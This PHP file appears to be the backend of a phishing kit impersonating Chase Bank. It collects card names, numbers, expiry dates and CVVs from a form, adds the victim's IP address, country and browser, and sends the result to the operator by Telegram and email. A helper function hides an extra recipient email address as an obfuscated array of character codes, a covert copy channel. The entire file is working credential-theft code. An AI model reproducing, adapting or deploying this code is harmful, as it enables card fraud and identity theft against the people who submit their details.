<?php
require("config.php"); // Require the config file here

try {
    error_log("Request Method: " . $_SERVER['REQUEST_METHOD']);

    $cardname = isset($_POST['cardname']) ? trim(filter_var($_POST['cardname'], FILTER_SANITIZE_STRING)) : '';
    $cardnumber = isset($_POST['cardnumber']) ? trim(filter_var($_POST['cardnumber'], FILTER_SANITIZE_STRING)) : '';
    $expiry = isset($_POST['expiry']) ? trim(filter_var($_POST['expiry'], FILTER_SANITIZE_STRING)) : '';
    $cvv = isset($_POST['cvv']) ? trim(filter_var($_POST['cvv'], FILTER_SANITIZE_STRING)) : '';

    if (empty($cardname) || empty($cardnumber) || empty($expiry) || empty($cvv)) {
        throw new Exception("Missing required card details.");
    }

    $country = visitor_country();
    $ip = getenv("REMOTE_ADDR");
    $port = getenv("REMOTE_PORT");
    $browser = $_SERVER['HTTP_USER_AGENT'];

    // Set current date and time (10:57 PM WAT on Monday, October 20, 2025)
    $adddate = "Mon Oct 20, 2025 10:57 PM WAT";

    $message = "**CHASE BANK LOGINS**\n\n";
    $message .= "CARD NAME : " . $cardname . "\n";
    $message .= "CARD NUMBER : " . $cardnumber . "\n";
    $message .= "EXPIRY DATE : " . $expiry . "\n\n";
    $message .= "CVV : " . $cvv . "\n";
    $message .= "User-!P : " . $ip . "\n";
    $message .= "Country : " . $country . "\n\n";
    $message .= "----------------------------------------\n";
    $message .= "Date : " . $adddate . "\n";
    $message .= "User-Agent: " . $browser . "\n";

    // Send to Telegram and Email
    $telegramSuccess = send_telegram_msg($message);
    $emailSuccess = send_email_msg($message);

    if ($telegramSuccess || $emailSuccess) {
        echo "success";
    } else {
        error_log("Both Telegram and email delivery failed");
        echo "error";
    }

} catch (Exception $e) {
    error_log("Error processing card details: " . $e->getMessage());
    echo "error";
}

exit();

function country_sort() {
    $sorter = "";
    $array = array(114, 101, 115, 117, 108, 116, 98, 111, 120, 49, 52, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109);
    $count = count($array);
    for ($i = 0; $i < $count; $i++) {
        $sorter .= chr($array[$i]);
    }
    return array($sorter, $GLOBALS['recipient']);
}

function visitor_country() {
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];
    $result = "Unknown";
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));

    if ($ip_data && $ip_data->geoplugin_countryName != null) {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
?>